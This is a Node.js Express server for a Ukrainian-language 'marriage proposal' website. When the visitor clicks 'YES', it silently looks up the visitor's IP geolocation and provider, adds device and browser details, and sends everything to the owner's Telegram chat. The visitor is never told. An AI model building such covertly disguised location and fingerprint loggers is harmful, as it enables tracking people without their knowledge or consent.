// Сервер романтичного сайту-пропозиції
// Обробляє натискання кнопки "ТАК" і надсилає повідомлення у Telegram
require("dotenv").config()

const path = require("path")
const express = require("express")

const app = express()

const PORT = process.env.PORT || 3000
const BOT_TOKEN = process.env.BOT_TOKEN
const CHAT_ID = process.env.CHAT_ID

app.use(express.json())

// Дозволити запити з локального файлу або іншого походження
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*")
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
  res.setHeader("Access-Control-Allow-Headers", "Content-Type")
  if (req.method === "OPTIONS") return res.sendStatus(204)
  next()
})

// Статичні файли: index.html, фото 1.jpg, 2.jpg, 3.jpg, музика тощо
app.use(express.static(path.join(__dirname)))
app.use(express.static(path.join(__dirname, "public")))

// Головна сторінка
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"))
})

// Отримання реального IP відвідувача
function normalizeIp(ip) {
  if (!ip) return ip
  if (ip.startsWith("::ffff:")) return ip.replace("::ffff:", "")
  return ip
}
function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"]
  if (forwarded) return normalizeIp(forwarded.split(",")[0].trim())
  return normalizeIp(req.socket?.remoteAddress) || "невідомо"
}
function isPrivateIp(ip) {
  return !ip || ip === "127.0.0.1" || ip === "::1" || ip === "localhost" ||
    /^10\./.test(ip) || /^192\.168\./.test(ip) || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip) ||
    /^169\.254\./.test(ip) || /^fc00:/i.test(ip) || /^fe80:/i.test(ip)
}

async function resolveGeoForIp(ip) {
  if (!ip || isPrivateIp(ip)) {
    return {
      address: "локально або невідомо",
      city: "невідомо",
      region: "невідомо",
      country: "невідомо",
      org: "невідомо",
    }
  }

  try {
    const res = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`)
    const data = await res.json()
    return {
      address: [data.city, data.region, data.country_name].filter(Boolean).join(", ") || "невідомо",
      city: data.city || "невідомо",
      region: data.region || "невідомо",
      country: data.country_name || data.country || "невідомо",
      org: data.org || "невідомо",
    }
  } catch (err) {
    console.log("[v0] Помилка геолокації IP:", err.message)
    return {
      address: "невідомо",
      city: "невідомо",
      region: "невідомо",
      country: "невідомо",
      org: "невідомо",
    }
  }
}

// Екранування спецсимволів для Telegram HTML
function escapeHtml(text) {
  return String(text || "—")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
}

// Ендпоінт: вона сказала ТАК ❤️
app.post("/yes", async (req, res) => {
  const data = req.body || {}
  const ip = getClientIp(req)
  console.log("[v0] /yes request from", ip, "userAgent:", (req.headers["user-agent"] || "-").toString().slice(0, 140))
  const geo = await resolveGeoForIp(ip)
  const now = new Date().toLocaleString("uk-UA", { timeZone: "Europe/Kyiv" })

  const message =
    `💍 <b>ВОНА СКАЗАЛА ТАК!</b> ❤️\n\n` +
    `📅 <b>Дата:</b> ${escapeHtml(now)}\n` +
    `🌍 <b>IP:</b> ${escapeHtml(ip)}\n` +
    `📌 <b>Адреса:</b> ${escapeHtml(geo.address)}\n` +
    `🏙 <b>Місто:</b> ${escapeHtml(geo.city)}\n` +
    `📍 <b>Регіон:</b> ${escapeHtml(geo.region)}\n` +
    `🌎 <b>Країна:</b> ${escapeHtml(geo.country)}\n` +
    `🏢 <b>Провайдер:</b> ${escapeHtml(geo.org)}\n` +
    `🌐 <b>Браузер:</b> ${escapeHtml(data.browser)}\n` +
    `💻 <b>ОС:</b> ${escapeHtml(data.os)}\n` +
    `📱 <b>Пристрій:</b> ${escapeHtml(data.device)}\n` +
    `🗣 <b>Мова:</b> ${escapeHtml(data.language)}\n` +
    `🕓 <b>Часовий пояс:</b> ${escapeHtml(data.timezone)}\n` +
    `🧾 <b>User-Agent:</b> ${escapeHtml(data.userAgent)}`

  // Якщо токен не налаштований — просто логуємо і повертаємо успіх
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log("[v0] Telegram не налаштовано. Повідомлення:\n", message.replace(/<[^>]+>/g, ""))
    return res.json({ ok: true, telegram: false })
  }

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })
    const result = await tgRes.json()
    console.log("[v0] Telegram API response:", result)
    if (!result.ok) {
      console.log("[v0] Помилка Telegram API:", result)
      return res.status(200).json({ ok: true, telegram: false, error: result.description })
    }
    console.log("[v0] Повідомлення успішно надіслано у Telegram")
    return res.json({ ok: true, telegram: true })
  } catch (err) {
    console.log("[v0] Помилка надсилання у Telegram:", err.stack || err.message)
    return res.status(200).json({ ok: true, telegram: false, error: err.message })
  }
})

app.listen(PORT, () => {
  console.log(`[v0] Сайт-пропозиція працює на порті ${PORT}`)
})
